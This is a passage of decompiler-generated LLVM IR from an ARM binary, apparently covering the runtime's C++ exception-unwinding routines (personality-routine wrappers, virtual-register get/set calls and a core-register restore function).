  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18f0c

dec_label_pc_18f00:                               ; preds = %.thread25, %dec_label_pc_18eb8
  %v3_18f00 = phi i32 [ %v3_18f00.pr, %.thread25 ], [ %v1_18eb8, %dec_label_pc_18eb8 ]
  %v2_18f04 = icmp eq i32 %v3_18f00, 0
  br i1 %v2_18f04, label %dec_label_pc_18f0c, label %dec_label_pc_19064

dec_label_pc_18f0c:                               ; preds = %bb164, %dec_label_pc_18fb8, %dec_label_pc_18f8c, %dec_label_pc_18f00, %dec_label_pc_18ea0
  %v0_18f0c = load i32, i32* @r7, align 4
  %v1_18f0c = add i32 %v0_18f0c, 8
  %v1_18c74 = inttoptr i32 %v1_18f0c to i32*
  %v2_18c74 = load i32, i32* %v1_18c74, align 4
  %v2_18c78 = icmp eq i32 %v2_18c74, 0
  br i1 %v2_18c78, label %dec_label_pc_18d34, label %dec_label_pc_18c80.preheader

dec_label_pc_18f14:                               ; preds = %entry
  %v3_18f14 = udiv i32 %v2_18c08, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18f24 = mul nuw nsw i32 %v3_18f14, 4
  %v3_18f28 = mul i32 %v2_18c08, 65536
  %v2_18f2c = add i32 %v6_18f24, %v4_18c08
  store i32 %v3_18f28, i32* %v4_18c28, align 8
  br label %dec_label_pc_18c50

dec_label_pc_18f3c:                               ; preds = %bb159, %dec_label_pc_18de8
  %v1_18f3c = add i32 %v0_18dd8, 4
  br label %dec_label_pc_18f40

dec_label_pc_18f40:                               ; preds = %dec_label_pc_18f80, %dec_label_pc_18f3c
  %v0_18f40 = phi i32 [ %v2_18f80, %dec_label_pc_18f80 ], [ %v2_18dd8, %dec_label_pc_18f3c ]
  %storemerge = phi i32 [ %v4_18f80, %dec_label_pc_18f80 ], [ %v1_18f3c, %dec_label_pc_18f3c ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18f40 = icmp slt i32 %v0_18f40, 0
  br i1 %v1_18f40, label %dec_label_pc_18e88, label %dec_label_pc_18f48

dec_label_pc_18f48:                               ; preds = %dec_label_pc_18e7c, %dec_label_pc_18f40, %dec_label_pc_19054, %dec_label_pc_18e88
  %v0_18f4c = phi i32 [ %v1_18e8c, %dec_label_pc_18e88 ], [ %storemerge, %dec_label_pc_18f40 ], [ %v1_19058, %dec_label_pc_19054 ], [ %v0_18e88.pre, %dec_label_pc_18e7c ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18e88 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f40 ], [ %v1_19054, %dec_label_pc_19054 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18e7c ]
  %v0_18f48 = load i32, i32* @sl, align 4
  %v3_18f48 = mul i32 %v0_18f48, 4
  %v2_18f4c = add i32 %v3_18f48, %v0_18f4c
  %v1_18c7465 = inttoptr i32 %v2_18f4c to i32*
  %v2_18c7466 = load i32, i32* %v1_18c7465, align 4
  %v2_18c7868 = icmp eq i32 %v2_18c7466, 0
  br i1 %v2_18c7868, label %dec_label_pc_18d34, label %dec_label_pc_18c80.preheader.lr.ph

dec_label_pc_18f54:                               ; preds = %dec_label_pc_18dd4
  %v0_18f64 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18f64, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18f6c = load i32, i32* @r8, align 4
  %v1_18f6c = add i32 %v0_18f6c, 32
  %v2_18f6c = inttoptr i32 %v1_18f6c to i32*
  %v3_18f6c = load i32, i32* %v2_18f6c, align 4
  store i32 %v3_18f6c, i32* @r4, align 4
  %v5_18f70 = call i32 @_Unwind_VRS_Get(i32 %v0_18f64, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18f70, i32* %r0.global-to-local, align 4
  %v3_18f74 = load i32, i32* %stack_var_-48, align 4
  %v0_18f78 = load i32, i32* @r4, align 4
  %v9_18f78 = icmp eq i32 %v0_18f78, %v3_18f74
  br i1 %v9_18f78, label %dec_label_pc_19020, label %dec_label_pc_18f54.dec_label_pc_18f80_crit_edge

dec_label_pc_18f54.dec_label_pc_18f80_crit_edge:  ; preds = %dec_label_pc_18f54
  %v0_18f80.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18f80

dec_label_pc_18f80:                               ; preds = %dec_label_pc_18f54.dec_label_pc_18f80_crit_edge, %dec_label_pc_19020
  %v0_18f80 = phi i32 [ %v0_18f80.pre, %dec_label_pc_18f54.dec_label_pc_18f80_crit_edge ], [ %v1_19024, %dec_label_pc_19020 ]
  %v1_18f80 = inttoptr i32 %v0_18f80 to i32*
  %v2_18f80 = load i32, i32* %v1_18f80, align 4
  %v4_18f80 = add i32 %v0_18f80, 4
  store i32 %v4_18f80, i32* @r7, align 4
  br label %dec_label_pc_18f40

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18e94
  %v0_18f9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18f9c, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18fa4 = load i32, i32* @r8, align 4
  %v1_18fa4 = add i32 %v0_18fa4, 32
  %v2_18fa4 = inttoptr i32 %v1_18fa4 to i32*
  %v3_18fa4 = load i32, i32* %v2_18fa4, align 4
  store i32 %v3_18fa4, i32* @r4, align 4
  %v5_18fa8 = call i32 @_Unwind_VRS_Get(i32 %v0_18f9c, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18fa8, i32* %r0.global-to-local, align 4
  %v3_18fac = load i32, i32* %stack_var_-48, align 4
  %v0_18fb0 = load i32, i32* @r4, align 4
  %v9_18fb0 = icmp eq i32 %v0_18fb0, %v3_18fac
  br i1 %v9_18fb0, label %dec_label_pc_18fb8, label %dec_label_pc_18f0c

dec_label_pc_18fb8:                               ; preds = %dec_label_pc_18f8c
  %v0_18fb8 = load i32, i32* @r8, align 4
  %v1_18fb8 = add i32 %v0_18fb8, 40
  %v2_18fb8 = inttoptr i32 %v1_18fb8 to i32*
  %v3_18fb8 = load i32, i32* %v2_18fb8, align 4
  %v1_18fbc = load i32, i32* @r7, align 4
  %v9_18fbc = icmp eq i32 %v3_18fb8, %v1_18fbc
  br i1 %v9_18fbc, label %dec_label_pc_18fc4, label %dec_label_pc_18f0c

dec_label_pc_18fc4:                               ; preds = %dec_label_pc_18fb8
  %v1_18fc4 = inttoptr i32 %v3_18fb8 to i32*
  %v2_18fc4 = load i32, i32* %v1_18fc4, align 4
  %v1_18fc8 = and i32 %v2_18fc4, 1073741824
  %v2_18fc8 = icmp eq i32 %v1_18fc8, 0
  br i1 %v2_18fc8, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18fc4
  %v2_18fcc = or i32 %v2_18fc4, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18fc4
  %tmp208 = bitcast i32 %v2_18fc4 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18fd0 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18fd4 = phi i32 [ %v2_19104, %.thread28 ], [ %v2_19104, %bb169 ], [ %v3_18fb8, %bb165 ], [ %v3_18fb8, %.thread26 ]
  %v0_18fd4 = phi i32 [ %v2_19114, %.thread28 ], [ %v2_19110, %bb169 ], [ %v2_18fcc, %bb165 ], [ %v2_18fd0, %.thread26 ]
  %v2_18fd4 = add i32 %v0_18fd4, %v1_18fd4
  store i32 %v2_18fd4, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18fec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18fec, i32* %r0.global-to-local, align 4
  %v5_18ff4 = call i32 @_Unwind_VRS_Set(i32 %v0_18fec, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18fec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1900c = load i32, i32* @r8, align 4
  store i32 %v0_1900c, i32* %stack_var_-48, align 4
  %v5_19014 = call i32 @_Unwind_VRS_Set(i32 %v0_18fec, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_19020:                               ; preds = %dec_label_pc_18f54
  %v0_19020 = load i32, i32* @r8, align 4
  %v1_19020 = add i32 %v0_19020, 40
  %v2_19020 = inttoptr i32 %v1_19020 to i32*
  %v3_19020 = load i32, i32* %v2_19020, align 4
  %v1_19024 = load i32, i32* @r7, align 4
  %v9_19024 = icmp eq i32 %v3_19020, %v1_19024
  br i1 %v9_19024, label %dec_label_pc_1902c, label %dec_label_pc_18f80

dec_label_pc_1902c:                               ; preds = %dec_label_pc_19020
  %v1_19030 = add i32 %v3_19020, 4
  store i32 %v1_19030, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_19038 = add i32 %v0_19020, 44
  %v3_19038 = inttoptr i32 %v2_19038 to i32*
  store i32 0, i32* %v3_19038, align 4
  %v0_1903c = load i32, i32* %r2.global-to-local, align 4
  %v1_1903c = load i32, i32* @r8, align 4
  %v2_1903c = add i32 %v1_1903c, 48
  %v3_1903c = inttoptr i32 %v2_1903c to i32*
  store i32 %v0_1903c, i32* %v3_1903c, align 4
  %v0_19040 = load i32, i32* @sl, align 4
  %v1_19040 = load i32, i32* @r8, align 4
  %v2_19040 = add i32 %v1_19040, 40
  %v3_19040 = inttoptr i32 %v2_19040 to i32*
  store i32 %v0_19040, i32* %v3_19040, align 4
  %v0_19044 = load i32, i32* %r0.global-to-local, align 4
  %v1_19044 = load i32, i32* @r8, align 4
  %v2_19044 = add i32 %v1_19044, 52
  %v3_19044 = inttoptr i32 %v2_19044 to i32*
  store i32 %v0_19044, i32* %v3_19044, align 4
  %v0_19048 = load i32, i32* @r7, align 4
  %v1_19048 = inttoptr i32 %v0_19048 to i32*
  %v2_19048 = load i32, i32* %v1_19048, align 4
  %v1_1904c = icmp slt i32 %v2_19048, 0
  br i1 %v1_1904c, label %dec_label_pc_19054, label %dec_label_pc_19100

dec_label_pc_19054:                               ; preds = %dec_label_pc_1902c
  %v0_19054 = load i32, i32* %r2.global-to-local, align 4
  %v1_19054 = add i32 %v0_19054, -3
  store i32 %v1_19054, i32* %r2.global-to-local, align 4
  %v0_19058 = load i32, i32* %r0.global-to-local, align 4
  %v1_19058 = add i32 %v0_19058, 4
  store i32 %v1_19058, i32* @r6, align 4
  br label %dec_label_pc_18f48

dec_label_pc_19064:                               ; preds = %dec_label_pc_18e74, %dec_label_pc_18f00, %dec_label_pc_18e2c, %dec_label_pc_18e00.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19074 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19074, i32* %r0.global-to-local, align 4
  %v5_1907c = call i32 @_Unwind_VRS_Get(i32 %v0_19074, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19080 = load i32, i32* @r7, align 4
  %v1_19080 = load i32, i32* @r8, align 4
  %v2_19080 = add i32 %v1_19080, 40
  %v3_19080 = inttoptr i32 %v2_19080 to i32*
  store i32 %v0_19080, i32* %v3_19080, align 4
  %v3_19084 = load i32, i32* %stack_var_-48, align 4
  %v3_19088 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_19088, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19090 = load i32, i32* @r8, align 4
  %v2_19090 = add i32 %v1_19090, 32
  %v3_19090 = inttoptr i32 %v2_19090 to i32*
  store i32 %v3_19084, i32* %v3_19090, align 4
  %v0_19094 = load i32, i32* %r2.global-to-local, align 4
  %v1_19094 = load i32, i32* @r8, align 4
  %v2_19094 = add i32 %v1_19094, 36
  %v3_19094 = inttoptr i32 %v2_19094 to i32*
  store i32 %v0_19094, i32* %v3_19094, align 4
  %v1_18dd0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_1909c:                               ; preds = %bb155
  %v1_1909c = inttoptr i32 %v0_18d24 to i32*
  %v2_1909c = load i32, i32* %v1_1909c, align 4
  %v1_190a0 = add i32 %v0_18d24, 4
  %v1_190a4 = and i32 %v2_1909c, 1073741824
  %v2_190a4 = icmp eq i32 %v1_190a4, 0
  %v2_190a8 = or i32 %v2_1909c, -2147483648
  %tmp210 = bitcast i32 %v2_1909c to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_190ac = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_190a4, i32 %v2_190ac, i32 %v2_190a8
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_190b0 = load i32, i32* @r8, align 4
  %v2_190b0 = add i32 %v1_190b0, 56
  %v3_190b0 = inttoptr i32 %v2_190b0 to i32*
  store i32 %v1_190a0, i32* %v3_190b0, align 4
  %v0_190b4 = load i32, i32* @r8, align 4
  store i32 %v0_190b4, i32* %r0.global-to-local, align 4
  %v4_190c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 32) to i32*), align 4
  store i32 102604, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_190c0)
  %v0_190cc = load i32, i32* %r0.global-to-local, align 4
  %v2_190cc = icmp eq i32 %v0_190cc, 0
  br i1 %v2_190cc, label %dec_label_pc_18dc4, label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_1909c
  %v0_190d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_190d4 = load i32, i32* @r7, align 4
  %v2_190d4 = add i32 %v1_190d4, %v0_190d4
  store i32 %v2_190d4, i32* %stack_var_-48, align 4
  %v0_190e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_190e4, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_190f4 = call i32 @_Unwind_VRS_Set(i32 %v0_190e4, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_19100:                               ; preds = %dec_label_pc_1902c
  %v0_19100 = load i32, i32* @sl, align 4
  %v3_19100 = mul i32 %v0_19100, 4
  %v0_19104 = load i32, i32* %r0.global-to-local, align 4
  %v2_19104 = add i32 %v0_19104, %v3_19100
  %v3_19104 = inttoptr i32 %v2_19104 to i32*
  %v4_19104 = load i32, i32* %v3_19104, align 4
  %v1_19108 = and i32 %v4_19104, 1073741824
  %v2_19108 = icmp eq i32 %v1_19108, 0
  br i1 %v2_19108, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19100
  %v2_19110 = or i32 %v4_19104, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19100
  %tmp212 = bitcast i32 %v4_19104 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19114 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19104, { 2, 1, 0 }
  uselistorder i32 %v1_19058, { 1, 0 }
  uselistorder i32 %v1_19054, { 1, 0 }
  uselistorder i32 %v1_19024, { 1, 0 }
  uselistorder i32 %v0_18fec, { 1, 0, 2, 3 }
  uselistorder i32 %v3_18fb8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18f80, { 1, 0 }
  uselistorder i32 %v0_18f80, { 1, 0 }
  uselistorder i32 %v2_18c7466, { 1, 0 }
  uselistorder i32 %v2_18f4c, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18c74, { 1, 0 }
  uselistorder i32 %v1_18f0c, { 1, 0 }
  uselistorder i32 %v3_18ea8, { 2, 0, 1 }
  uselistorder i32 %v0_18e88, { 1, 0 }
  uselistorder i32 %v0_18e88.pre, { 1, 0 }
  uselistorder i32 %v1_18de0, { 1, 0 }
  uselistorder i32 %v2_18dd8, { 1, 0 }
  uselistorder i32 %v0_18d68, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18d28, { 1, 0 }
  uselistorder i32 %v1_18d24, { 1, 0 }
  uselistorder i32 %v0_18d24, { 1, 0, 2 }
  uselistorder i32 %v4_18cfc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18ea0, { 1, 2, 0 }
  uselistorder i32 %v0_18cd4, { 1, 0 }
  uselistorder i32 %v3_18cd0, { 1, 0, 2 }
  uselistorder i32 %v1_18ca4, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18edc, { 1, 0 }
  uselistorder i1 %v2_18d10, { 1, 0, 2 }
  uselistorder i32 %v1_18c14, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 20, 0, 5, 12, 13, 4, 10, 11, 15, 16, 17, 18, 6, 7, 14, 3, 1, 8, 19, 2, 9 }
  uselistorder i32 -3, { 2, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 52, { 25, 2, 3, 1, 24, 15, 9, 5, 13, 14, 23, 21, 4, 22, 0, 19, 20, 6, 7, 11, 17, 12, 10, 18, 16, 8 }
  uselistorder i32 48, { 47, 9, 10, 37, 7, 11, 1, 29, 12, 33, 34, 30, 31, 13, 2, 41, 14, 42, 43, 5, 15, 44, 16, 45, 17, 18, 19, 3, 20, 6, 0, 21, 22, 23, 4, 24, 25, 26, 27, 8, 28, 38, 39, 40, 36, 46, 32, 35 }
  uselistorder i32 44, { 32, 5, 6, 30, 31, 7, 1, 33, 34, 0, 2, 3, 4, 24, 29, 25, 26, 27, 28, 21, 22, 23, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 10 }
  uselistorder i32 -2147483648, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 1073741824, { 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 17, 13, 18, 14, 19, 15, 20, 16, 21, 22, 23, 27, 24, 28, 25, 29, 26, 30, 32, 31, 33, 41, 43, 44, 40, 42, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 108) to i32*), { 1, 0 }
  uselistorder i32 88, { 11, 12, 9, 0, 10, 7, 8, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_24010.405 to i32), { 45, 7, 46, 47, 8, 9, 89, 120, 121, 90, 91, 92, 122, 10, 11, 93, 123, 2, 124, 125, 126, 127, 128, 129, 3, 4, 0, 5, 94, 95, 130, 12, 96, 131, 13, 14, 15, 16, 17, 132, 44, 22, 24, 19, 20, 23, 18, 21, 133, 25, 134, 135, 136, 26, 97, 137, 138, 27, 98, 139, 140, 28, 29, 30, 141, 142, 31, 143, 32, 144, 145, 146, 99, 147, 33, 148, 6, 100, 149, 101, 150, 102, 151, 34, 152, 153, 35, 36, 104, 154, 155, 156, 157, 158, 159, 57, 56, 58, 160, 48, 82, 78, 76, 75, 77, 79, 80, 81, 74, 83, 69, 71, 70, 68, 67, 72, 73, 64, 63, 66, 65, 62, 61, 60, 59, 106, 84, 105, 85, 49, 86, 103, 107, 161, 108, 109, 162, 110, 37, 38, 163, 111, 164, 112, 165, 39, 166, 114, 113, 55, 52, 53, 54, 51, 40, 87, 50, 88, 41, 42, 115, 116, 117, 167, 43, 168, 169, 170, 1, 118, 119 }
  uselistorder i32 -2, { 0, 26, 27, 9, 10, 11, 12, 2, 4, 5, 3, 13, 14, 15, 1, 6, 8, 7, 16, 24, 20, 21, 22, 23, 18, 17, 25, 19 }
  uselistorder i32 80, { 10, 11, 12, 6, 4, 5, 1, 2, 0, 3, 7, 8, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19064, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18f80, { 1, 0 }
  uselistorder label %dec_label_pc_18f48, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18f0c, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18e88, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18dc8, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18dc4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18d24, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18c80, { 1, 0 }
  uselistorder label %dec_label_pc_18c80.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18c80.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19120(i32 %arg1) local_unnamed_addr {
dec_label_pc_19120:
  %v0_19120 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19120, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19120
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19120, %bb
  %v4_19128 = phi i32 [ %arg1, %dec_label_pc_19120 ], [ 0, %bb ]
  ret i32 %v4_19128

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 43, 16, 17, 14, 18, 57, 58, 59, 60, 61, 62, 11, 12, 15, 63, 64, 65, 13, 44, 39, 45, 46, 47, 48, 49, 6, 19, 20, 40, 4, 34, 66, 3, 25, 26, 27, 50, 21, 24, 51, 52, 53, 54, 55, 36, 5, 7, 67, 22, 8, 56, 41, 42, 28, 29, 23, 32, 31, 30, 33, 9, 10, 38, 35, 37, 68, 69, 70, 71 }
  uselistorder i1* @cpsr_z, { 0, 1, 44, 39, 45, 46, 47, 48, 49, 50, 51, 52, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 53, 15, 16, 17, 18, 19, 20, 21, 22, 40, 41, 42, 43, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19130 = load i32, i32* @r1, align 4
  %v2_19130 = load i32, i32* @r2, align 4
  %v4_19130 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19130, i32 %v2_19130, i32 2)
  ret i32 %v4_19130
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19138 = load i32, i32* @r1, align 4
  %v2_19138 = load i32, i32* @r2, align 4
  %v4_19138 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_19138, i32 %v2_19138, i32 1)
  ret i32 %v4_19138
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19140 = load i32, i32* @r1, align 4
  %v2_19140 = load i32, i32* @r2, align 4
  %v4_19140 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19140, i32 %v2_19140, i32 0)
  ret i32 %v4_19140

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 11, 12, 103, 16, 57, 58, 59, 60, 1, 61, 62, 63, 64, 65, 66, 9, 67, 29, 30, 31, 13, 32, 33, 34, 35, 36, 46, 47, 48, 49, 50, 51, 41, 14, 68, 69, 17, 18, 19, 20, 104, 52, 53, 54, 21, 15, 8, 105, 106, 107, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 0, 108, 109, 110, 111, 112, 113, 114, 115, 116, 121, 122, 123, 124, 117, 2, 118, 119, 120, 37, 38, 3, 4, 5, 39, 40, 6, 7, 55, 22, 84, 85, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 96, 42, 43, 44, 97, 98, 23, 99, 45, 24, 25, 26, 27, 28, 56, 100, 101, 102 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_19148 = add i32 %tmp, 56
  %v4_19148 = inttoptr i32 %v3_19148 to i32*
  %v5_19148 = load i32, i32* %v4_19148, align 4
  %v6_19148 = add i32 %tmp, 60
  %v7_19148 = inttoptr i32 %v6_19148 to i32*
  %v8_19148 = load i32, i32* %v7_19148, align 4
  %v2_19154 = load i32, i32* %arg1, align 4
  %v3_19154 = add i32 %tmp, 4
  %v4_19154 = inttoptr i32 %v3_19154 to i32*
  %v5_19154 = load i32, i32* %v4_19154, align 4
  store i32 %v5_19154, i32* @r1, align 4
  %v12_19154 = add i32 %tmp, 16
  %v13_19154 = inttoptr i32 %v12_19154 to i32*
  %v14_19154 = load i32, i32* %v13_19154, align 4
  store i32 %v14_19154, i32* @r4, align 4
  %v15_19154 = add i32 %tmp, 20
  %v16_19154 = inttoptr i32 %v15_19154 to i32*
  %v17_19154 = load i32, i32* %v16_19154, align 4
  store i32 %v17_19154, i32* @r5, align 4
  %v18_19154 = add i32 %tmp, 24
  %v19_19154 = inttoptr i32 %v18_19154 to i32*
  %v20_19154 = load i32, i32* %v19_19154, align 4
  store i32 %v20_19154, i32* @r6, align 4
  %v21_19154 = add i32 %tmp, 28
  %v22_19154 = inttoptr i32 %v21_19154 to i32*
  %v23_19154 = load i32, i32* %v22_19154, align 4
  store i32 %v23_19154, i32* @r7, align 4
  %v24_19154 = add i32 %tmp, 32
  %v25_19154 = inttoptr i32 %v24_19154 to i32*
  %v26_19154 = load i32, i32* %v25_19154, align 4
  store i32 %v26_19154, i32* @r8, align 4
  %v27_19154 = add i32 %tmp, 36
  %v28_19154 = inttoptr i32 %v27_19154 to i32*
  %v29_19154 = load i32, i32* %v28_19154, align 4
  store i32 %v29_19154, i32* @sb, align 4
  %v30_19154 = add i32 %tmp, 40
  %v31_19154 = inttoptr i32 %v30_19154 to i32*
  %v32_19154 = load i32, i32* %v31_19154, align 4
  store i32 %v32_19154, i32* @sl, align 4
  store i32 %v8_19148, i32* @ip, align 4
  store i32 %v5_19148, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_19148)
  ret i32 %v2_19154

; uselistorder directives
  uselistorder i32 %v8_19148, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 147, 148, 149, 11, 150, 109, 21, 22, 23, 110, 111, 112, 113, 114, 115, 116, 27, 28, 29, 30, 31, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 67, 72, 73, 74, 75, 81, 82, 80, 83, 5, 84, 6, 85, 86, 87, 88, 117, 24, 25, 7, 153, 151, 152, 38, 90, 91, 105, 106, 107, 34, 10, 35, 154, 119, 118, 1, 120, 121, 2, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 8, 188, 189, 190, 191, 192, 193, 194, 195, 196, 122, 123, 124, 125, 197, 198, 144, 0, 199, 126, 127, 12, 200, 201, 13, 76, 77, 14, 89, 9, 61, 62, 63, 64, 65, 66, 78, 79, 108, 68, 69, 32, 33, 128, 130, 129, 3, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 205, 202, 203, 204, 4, 206, 15, 16, 132, 133, 134, 135, 136, 137, 138, 139, 131, 140, 141, 142, 70, 71, 143, 17, 145, 18, 19, 26, 146, 20 }
  uselistorder i32 40, { 24, 20, 21, 22, 23, 8, 9, 12, 14, 7, 25, 2, 4, 5, 13, 1, 11, 6, 3, 10, 0, 15, 16, 17, 18, 19 }
